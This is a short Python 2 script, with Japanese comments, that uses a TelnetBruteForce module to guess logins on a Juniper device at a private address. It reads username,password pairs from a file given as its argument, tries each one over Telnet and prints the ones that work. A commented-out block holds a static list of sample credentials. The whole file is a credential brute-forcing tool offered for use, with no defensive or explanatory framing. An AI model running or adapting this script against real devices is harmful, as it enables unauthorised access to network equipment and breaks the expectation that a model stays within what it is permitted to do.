#!env python
# -*- coding: utf-8 -*-                                                          
import TelnetBruteForce
import sys

t = TelnetBruteForce.TelnetBruteForce(f_debug = False)

# 対象の機器名を指定
TelnetBruteForce.setNode_Juniper(t)

# 対象のホスト名を指定
t.set_host_name("192.168.100.253")

"""
以下は静的なテストを埋め込むときのテスト
liCandidate = []
liCandidate.append( ("user", "password") )
liCandidate.append( ("user2", "password2") )
liCandidate.append( ("user999", "user999") )
for stUser, stPass in liCandidate:
    print "[Try]: " + stUser
    if t.login(stUser, stPass, inFailTimeout = 1):
        print "[OK]: " + stPass 
"""

"""
以下は第一引数からUser,Passの対を持ってくるとき
"""
if len(sys.argv) == 2:
    frd = open(sys.argv[1])
    stLine = frd.readline().strip()
    while stLine:
        stUser, stPass = tuple( stLine.split(",") )
        print "[Try]: " + stUser
        if t.login(stUser, stPass, inFailTimeout = 1):
            print "[OK]: " + stPass
        stLine = frd.readline().strip()
